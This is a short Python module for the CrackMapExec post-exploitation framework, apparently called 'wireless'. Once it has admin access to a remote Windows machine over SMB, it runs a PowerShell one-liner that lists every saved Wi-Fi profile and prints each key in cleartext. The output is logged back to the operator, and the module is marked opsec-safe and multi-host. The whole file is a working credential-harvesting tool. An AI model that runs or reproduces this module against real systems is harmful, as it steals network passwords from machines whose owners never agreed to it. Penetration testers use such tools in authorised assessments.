class CMEModule:

    name = 'wireless'
    description = "Get key of all wireless interfaces"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        '''     

    def on_admin_login(self, context, connection):

        command = 'powershell.exe -c "(netsh wlan show profiles) | Select-String """"\:(.+)$"""" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}'
        context.log.info('Executing command')
        p = connection.execute(command, True)
        context.log.success(p)
